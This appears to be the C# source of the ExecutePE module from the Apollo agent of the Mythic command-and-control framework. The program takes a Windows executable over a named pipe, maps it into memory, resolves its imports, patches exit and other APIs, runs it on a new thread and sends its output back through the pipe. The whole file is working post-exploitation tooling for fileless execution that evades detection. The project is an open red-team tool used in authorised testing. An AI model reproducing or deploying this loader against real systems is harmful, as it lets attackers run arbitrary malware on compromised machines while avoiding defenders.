using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Linq;
using ExecutePE.Internals;
using ExecutePE.Patchers;
using System.IO.Pipes;
using static ExecutePE.Internals.NativeDeclarations;
using System.Threading.Tasks;
using System.Diagnostics;
using ExecutePE.Helpers;
using System.Threading;
using System.Runtime.InteropServices;
using ApolloInterop.Serializers;
using System.Collections.Concurrent;
using ApolloInterop.Interfaces;
using ApolloInterop.Classes;
using ApolloInterop.Classes.Core;
using ApolloInterop.Structs.ApolloStructs;
using ST = System.Threading.Tasks;
using ApolloInterop.Classes.Events;
using ApolloInterop.Enums.ApolloEnums;
using System.ComponentModel;
using ApolloInterop.Constants;

namespace ExecutePE
{
    internal static class Program
    {

        [DllImport("shell32.dll", SetLastError = true)]
        static extern IntPtr CommandLineToArgvW(
           [MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine,
           out int pNumArgs);

        [DllImport("kernel32.dll")]
        static extern IntPtr LocalFree(IntPtr hMem);

        private static JsonSerializer _jsonSerializer = new JsonSerializer();
        private static string _namedPipeName;
        private static ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
        private static ConcurrentQueue<IMythicMessage> _recieverQueue = new ConcurrentQueue<IMythicMessage>();
        private static AsyncNamedPipeServer _server;
        private static AutoResetEvent _senderEvent = new AutoResetEvent(false);
        private static AutoResetEvent _receiverEvent = new AutoResetEvent(false);
        private static ConcurrentDictionary<string, ChunkedMessageStore<IPCChunkedData>> MessageStore = new ConcurrentDictionary<string, ChunkedMessageStore<IPCChunkedData>>();
        private static CancellationTokenSource _cts = new CancellationTokenSource();
        private static Action<object> _sendAction;
        private static ST.Task _clientConnectedTask = null;

        internal static Encoding encoding;
        private static string _output = "";

        private static int Main(string[] args)
        {
            if (args.Length != 1)
            {
                throw new Exception("No named pipe name given.");
            }
            _namedPipeName = args[0];

            
            _sendAction = (object p) =>
            {
                PipeStream pipe = (PipeStream)p;

                while (pipe.IsConnected && !_cts.IsCancellationRequested)
                {
                    WaitHandle.WaitAny(new WaitHandle[] {
                        _senderEvent,
                        _cts.Token.WaitHandle
                    });
                    if (!_cts.IsCancellationRequested && _senderQueue.TryDequeue(out byte[] result))
                    {
                        pipe.BeginWrite(result, 0, result.Length, OnAsyncMessageSent, pipe);
                    }
                }
                pipe.Flush();
                pipe.Close();
            };
            _server = new AsyncNamedPipeServer(_namedPipeName, null, 1, IPC.SEND_SIZE, IPC.RECV_SIZE);
            _server.ConnectionEstablished += OnAsyncConnect;
            _server.MessageReceived += OnAsyncMessageReceived;
            _receiverEvent.WaitOne();
            if (_recieverQueue.TryDequeue(out IMythicMessage exeArgs))
            {
                if (exeArgs.GetTypeCode() != MessageType.IPCCommandArguments)
                {
                    throw new Exception($"Got invalid message type. Wanted {MessageType.IPCCommandArguments}, got {exeArgs.GetTypeCode()}");
                }

                IPCCommandArguments command = (IPCCommandArguments)exeArgs;
                try
                {

                    if (IntPtr.Size != 8)
                    {
                        return -1;
                    }
                    string[] realArgs = ParseCommandLine(command.StringData);

                    var peRunDetails = ParseArgs(realArgs.ToList());
                    peRunDetails.binaryBytes = command.ByteData;

                    if (peRunDetails == null)
                    {
                        return -10;
                    }

                    var peMapper = new PEMapper();
                    peMapper.MapPEIntoMemory(peRunDetails.binaryBytes, out var pe, out var currentBase);

                    var importResolver = new ImportResolver();
                    importResolver.ResolveImports(pe, currentBase);

                    peMapper.SetPagePermissions();

                    var argumentHandler = new ArgumentHandler();
                    if (!argumentHandler.UpdateArgs(peRunDetails.filename, peRunDetails.args))
                    {
                        return -3;
                    }

                    var exitPatcher = new ExitPatcher();
                    if (!exitPatcher.PatchExit())
                    {
                        return -8;
                    }

                    var extraEnvironmentalPatcher = new ExtraEnvironmentPatcher((IntPtr)currentBase);
                    extraEnvironmentalPatcher.PerformExtraEnvironmentPatches();

                    // Patch this last as may interfere with other activity
                    var extraAPIPatcher = new ExtraAPIPatcher();

                    if (!extraAPIPatcher.PatchAPIs((IntPtr)currentBase))
                    {
                        return -9;
                    }
                    using (StdHandleRedirector redir = new StdHandleRedirector(OnBufferWrite))
                    {
                        StartExecution(peRunDetails.args, pe, currentBase);
                    }


                    // Revert changes
                    exitPatcher.ResetExitFunctions();
                    extraAPIPatcher.RevertAPIs();
                    extraEnvironmentalPatcher.RevertExtraPatches();
                    argumentHandler.ResetArgs();
                    peMapper.ClearPE();
                    importResolver.ResetImports();
                }
                catch (Exception e)
                {
                    return -6;
                } finally
                {
                    _cts.Cancel();
                }
            }
            return 0;
        }

        private static string[] ParseCommandLine(string cmdline)
        {
            int numberOfArgs;
            IntPtr ptrToSplitArgs;
            string[] splitArgs;

            ptrToSplitArgs = CommandLineToArgvW(cmdline, out numberOfArgs);

            // CommandLineToArgvW returns NULL upon failure.
            if (ptrToSplitArgs == IntPtr.Zero)
                throw new ArgumentException("Unable to split argument.", new Win32Exception());

            // Make sure the memory ptrToSplitArgs to is freed, even upon failure.
            try
            {
                splitArgs = new string[numberOfArgs];

                // ptrToSplitArgs is an array of pointers to null terminated Unicode strings.
                // Copy each of these strings into our split argument array.
                for (int i = 0; i < numberOfArgs; i++)
                    splitArgs[i] = Marshal.PtrToStringUni(
                        Marshal.ReadIntPtr(ptrToSplitArgs, i * IntPtr.Size));

                return splitArgs;
            }
            finally
            {
                // Free memory obtained by CommandLineToArgW.
                LocalFree(ptrToSplitArgs);
            }
        }

        private static void OnBufferWrite(object sender, StringDataEventArgs args)
        {
            if (args.Data != null)
            {
                _senderQueue.Enqueue(Encoding.UTF8.GetBytes(args.Data));
                _senderEvent.Set();
            }
        }

        private static void OnAsyncMessageSent(IAsyncResult result)
        {
            PipeStream pipe = (PipeStream)result.AsyncState;
            pipe.EndWrite(result);
            // Potentially delete this since theoretically the sender Task does everything
            if (_senderQueue.TryDequeue(out byte[] data))
            {
                pipe.BeginWrite(data, 0, data.Length, OnAsyncMessageSent, pipe);
            }
        }

        private static void OnAsyncMessageReceived(object sender, NamedPipeMessageArgs args)
        {
            IPCChunkedData chunkedData = _jsonSerializer.Deserialize<IPCChunkedData>(
                Encoding.UTF8.GetString(args.Data.Data.Take(args.Data.DataLength).ToArray()));
            lock (MessageStore)
            {
                if (!MessageStore.ContainsKey(chunkedData.ID))
                {
                    MessageStore[chunkedData.ID] = new ChunkedMessageStore<IPCChunkedData>();
                    MessageStore[chunkedData.ID].MessageComplete += DeserializeToReceiverQueue;
                }
            }
            MessageStore[chunkedData.ID].AddMessage(chunkedData);
        }

        private static void DeserializeToReceiverQueue(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
        {
            MessageType mt = args.Chunks[0].Message;
            List<byte> data = new List<byte>();

            for (int i = 0; i < args.Chunks.Length; i++)
            {
                data.AddRange(Convert.FromBase64String(args.Chunks[i].Data));
            }

            IMythicMessage msg = _jsonSerializer.DeserializeIPCMessage(data.ToArray(), mt);
            //Console.WriteLine("We got a message: {0}", mt.ToString());
            _recieverQueue.Enqueue(msg);
            _receiverEvent.Set();
        }

        public static void OnAsyncConnect(object sender, NamedPipeMessageArgs args)
        {
            // We only accept one connection at a time, sorry.
            if (_clientConnectedTask != null)
            {
                args.Pipe.Close();
                return;
            }
            _clientConnectedTask = new ST.Task(_sendAction, args.Pipe);
            _clientConnectedTask.Start();
        }


        private static void StartExecution(string[] binaryArgs, PELoader pe, long currentBase)
        {
            try
            {
                var threadStart = (IntPtr)(currentBase + (int)pe.OptionalHeader64.AddressOfEntryPoint);
                var hThread = NativeDeclarations.CreateThread(IntPtr.Zero, 0, threadStart, IntPtr.Zero, 0, IntPtr.Zero);

                NativeDeclarations.WaitForSingleObject(hThread, 0xFFFFFFFF);
            }
            catch (Exception e)
            {


            }

        }

        private static PeRunDetails ParseArgs(List<string> args)
        {
            string filename;
            string[] binaryArgs;

            if (args.Count > 1)
            {
                binaryArgs = new string[args.Count - 1];
                Array.Copy(args.ToArray(), 1, binaryArgs, 0, args.Count - 1);
            }
            else
            {
                binaryArgs = new string[] { };
            }
            filename = args[0];
            
            return new PeRunDetails { filename = filename, args = binaryArgs };
        }

        private static void PrintUsage()
        {








        }

    }

    internal class PeRunDetails
    {
        internal string filename;
        internal string[] args;
        internal byte[] binaryBytes;
    }

}
